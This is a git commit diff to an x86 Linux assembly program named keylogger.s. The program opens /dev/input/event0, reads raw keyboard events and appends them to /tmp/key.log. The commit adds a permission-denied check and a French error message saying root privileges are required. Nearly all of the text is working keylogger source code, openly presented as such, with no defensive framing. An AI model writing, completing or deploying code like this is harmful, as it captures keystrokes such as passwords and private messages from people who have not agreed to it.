de4f9d292497ff60b441e74fbc95a00d70691bf3
quentin-csg <qcassaigne73@gmail.com>
2024-05-01 14:57:40 +0200

    error_message

--- keylogger.s
+++ keylogger.s
@@ -1,15 +1,8 @@
-SECTION .data
-    output_file   db "key.log", 0
-    event_keyboard db "/dev/input/event0", 0
-
-SECTION .bss
-    input_event resb 16    # 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)
-
-
-SECTION .text
 global _start
 
+section .text
 _start:
+
     ; open event_file
     xor ecx, ecx
     mov ebx, event_keyboard
@@ -21,8 +14,11 @@ _start:
     mov edx, 420          ; 644
     mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
     mov ebx, output_file
-    mov eax, 5            ; SYS_OPEN
+    mov eax, 5            ; sys_open
     int 0x80
+
+    cmp eax, -13   ; EACCES - Permission Denied - code d'erreur -13
+    je erreur      ; jump si registre eax du syscall open = -13
 
     mov edi, eax 
 
@@ -31,5 +27,30 @@ input:
     mov edx, 16
     mov ecx, input_event
     mov ebx, esi                    ; File descriptor for reading bytes
-    mov eax, 3                      ; SYS_READ
+    mov eax, 3                      ; sys_read
     int 0x80
+
+
+
+
+erreur:
+    mov eax, 4              ; sys_write
+    mov ebx, 2              ; stderr
+    mov ecx, errMsg
+    mov edx, lenErrMsg
+    int 0x80
+
+    mov eax, 1              ; sys_exit
+    int 0x80
+    ret
+
+
+section .data
+    event_keyboard db "/dev/input/event0", 0
+    output_file   db "/tmp/key.log", 0
+    errMsg db "Besoin des privilèges du superUtilisateur", 0xa
+    lenErrMsg equ $ - errMsg
+
+
+section .bss
+    input_event resb 16    ; 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)
